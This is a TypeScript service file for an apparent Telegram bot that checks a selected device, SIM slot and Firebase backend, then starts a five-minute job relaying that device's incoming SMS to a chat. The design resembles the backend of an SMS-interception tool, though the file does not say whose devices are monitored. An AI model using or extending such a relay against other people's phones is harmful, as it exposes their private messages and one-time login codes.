import { SessionRepository } from "../database/repositories/SessionRepository";
import { MonitoringRepository } from "../database/repositories/MonitoringRepository";
import { MonitorChatRepository } from "../database/repositories/MonitorChatRepository";
import { BackendRepository } from "../database/repositories/BackendRepository";
import { DeviceRepository } from "../database/repositories/DeviceRepository";
import { FirebaseRestClient } from "../backends/firebase/FirebaseRestClient";
import { ProcessedSmsRepository } from "../database/repositories/ProcessedSmsRepository";


export class MonitoringService {

    static async start(
        telegramId: number
    ) {


        // ======================================================
        // Verify Session
        // ======================================================

        const session: any =
            SessionRepository.find(
                telegramId
            );


        if (!session) {

            return {

                success:false,

                message:
`❌ No device selected.

Use

/finddevice`

            };

        }



        if (
            !SessionRepository.hasCompleteSession(
                telegramId
            )
        ) {

            return {

                success:false,

                message:
`❌ SIM slot not selected.

Please choose a SIM first.`

            };

        }




        // ======================================================
        // Verify Device
        // ======================================================

        const device =
            DeviceRepository.findByTelegramAndDeviceId(

                telegramId,

                session.device_id

            );



        if (!device) {


            SessionRepository.clear(
                telegramId
            );


            return {

                success:false,

                message:
`❌ Device no longer exists.

Please run

/finddevice`

            };

        }





        // ======================================================
        // Verify Backend
        // ======================================================

        const backend =
            BackendRepository.findConfig(
                session.backend_id
            );



        if (!backend) {

            return {

                success:false,

                message:
                "❌ Backend not found."

            };

        }



        if (
            backend.status !== "online"
        ) {

            return {

                success:false,

                message:
                "❌ Backend is currently offline."

            };

        }





        // ======================================================
        // Verify Chat
        // ======================================================

        const chat =
            MonitorChatRepository.findByTelegramId(
                telegramId
            );



        if (!chat) {

            return {

                success:false,

                message:
`❌ No verified chat found.

Use

/verifychat`

            };

        }





        // ======================================================
        // STEP 3
        // Mark existing Firebase SMS as processed
        // ======================================================


        try {


            const databaseUrl =
                backend.config.database_url ||
                backend.config;



            if (
                backend.backend_type === "firebase_json" ||
                backend.backend_type === "firebase_url"
            ) {


                const smsData =
                    await FirebaseRestClient.getIncomingSms(

                        databaseUrl,

                        session.device_id

                    );



                if (smsData) {


                    ProcessedSmsRepository.bulkCreate({

                        backendId:
                            session.backend_id,


                        deviceId:
                            session.device_id,


                        keys:
                            Object.keys(smsData)

                    });



                    console.log(
                        "Existing SMS marked:",
                        Object.keys(smsData).length
                    );


                }


            }


        } catch(error:any) {


            console.error(
                "Old SMS marking failed:",
                error.message
            );


        }





        // ======================================================
        // Replace Existing Monitoring
        // ======================================================


        MonitoringRepository.remove(
            telegramId
        );



        const expires =
            new Date(
                Date.now()
                +
                (5 * 60 * 1000)
            );



        MonitoringRepository.start({

            telegramId,


            backendId:
                session.backend_id,


            deviceId:
                session.device_id,


            simSlot:
                session.sim_slot,


            chatId:
                chat.chat_id,


            expiresAt:
                expires.toLocaleString("sv-SE")

        });





        return {


            success:true,


            device,


            backend,


            chat,


            expiresAt:expires


        };


    }





    static stop(

        telegramId:number,

        reason="manual"

    ) {


        MonitoringRepository.stop(

            telegramId,

            reason

        );


        MonitoringRepository.remove(

            telegramId

        );


        return {

            success:true

        };


    }


}